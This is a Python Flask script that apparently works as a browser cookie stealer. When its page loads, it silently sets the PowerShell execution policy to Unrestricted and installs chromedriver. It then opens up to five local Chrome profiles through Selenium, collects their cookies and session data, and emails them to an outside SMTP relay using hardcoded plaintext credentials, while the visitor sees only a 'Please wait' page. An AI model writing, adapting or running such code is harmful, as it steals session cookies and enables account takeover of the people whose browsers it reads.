from flask import Flask, session, render_template_string
import json
import smtplib
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import WebDriverException
import subprocess
import os

app = Flask(__name__)
app.secret_key = 'secret'  # Set a secret key for the Flask session

# SMTP configuration
SMTP_SERVER = 'relay.dnsexit.com'  # Replace with your SMTP server
SMTP_PORT = 2525 # For TLS
SMTP_USERNAME = 'solitary'  # Replace with your email
SMTP_PASSWORD = 'Sollamatenda@123'  # Replace with your email password
SENDER_EMAIL = 'admin@solitary.work.gd'  # The sender's email (can be the same as SMTP_USERNAME)
TO_EMAIL = 'admin@solitary.work.gd'  # Replace with the recipient's email

# Function to install Chrome driver
def install_chrome_driver():
    if os.name == 'nt':  # Windows
        subprocess.run(['powershell', '-Command', 'Set-ExecutionPolicy', '-ExecutionPolicy', 'Unrestricted', '-Force'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['powershell', '-Command', 'Install-PackageProvider', '-Name', 'Chocolatey', '-Force'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['powershell', '-Command', 'choco', 'install', 'chromedriver', '-y'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else: 
        subprocess.run(['sudo', 'apt-get', 'update'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['sudo', 'apt-get', 'install', '-y', 'chromedriver'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Function to get the Chrome webdriver for a specific profile
def get_chrome_driver(profile):
    options = Options()
    options.add_argument(f"--user-data-dir={profile}")  # Specify the profile directory
    options.add_argument("--no-close")  # Prevent the user from closing the window
    driver = webdriver.Chrome(options=options)
    return driver

# Function to get cookies from the driver
def get_cookies(driver):
    driver.get("https://google.com")
    WebDriverWait(driver, 10, poll_frequency=0.5).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
    return driver.get_cookies()

# Function to process cookies
def process_cookies(cookies):
    cookie_info = []
    for cookie in cookies:
        cookie_dict = {
            'name': cookie['name'],
            'value': cookie['value'],
            'domain': cookie['domain'],
            'path': cookie['path'],
            'expires': cookie['expiry']
        }
        cookie_info.append(cookie_dict)
    for key, value in session.items():
        cookie_dict = {
            'name': key,
            'value': value,
            'domain': '',  # No domain for session cookies
            'path': '',  # No path for session cookies
            'expires': ''  # No expires for session cookies
        }
        cookie_info.append(cookie_dict)
    return json.dumps(cookie_info, indent=4)

# Function to send cookies via email
def send_cookies_via_email(cookie_info_json):
    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
        server.starttls()
        server.login(SMTP_USERNAME, SMTP_PASSWORD)
        message = f"Subject: Cookies \nFrom: {SENDER_EMAIL}\nTo: {TO_EMAIL}\n\n{cookie_info_json}"
        server.sendmail(SENDER_EMAIL, TO_EMAIL, message)

@app.route('/')
def redirect_to_example():
    # Display an HTML message while downloading the ChromeDriver
    html_message = render_template_string("<html><body><h1>Please wait...</h1></body></html>")
    
    # Get a list of all Chrome profiles
    profiles = []
    if os.name == 'nt':  # Windows
        profiles_dir = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
    else: 
        profiles_dir = os.path.join(os.environ['HOME'], '.config', 'google-chrome', 'Default')
    for profile in os.listdir(profiles_dir):
        if os.path.isdir(os.path.join(profiles_dir, profile)):
            profiles.append(os.path.join(profiles_dir, profile))
    
    # Limit to 5 profiles
    profiles = profiles[:5]
    
    cookie_info_json = ""
    for profile in profiles:
        driver = get_chrome_driver (profile)
        driver.get("https://google.com")  # Open Instagram in the browser
        cookies = get_cookies(driver)
        cookie_info = process_cookies(cookies)
        cookie_info_json += f"Profile: {profile}\n{cookie_info}\n\n"
        driver.quit()
    
    send_cookies_via_email(cookie_info_json)

    return html_message

if __name__ == '__main__':
    app.run(debug=True)
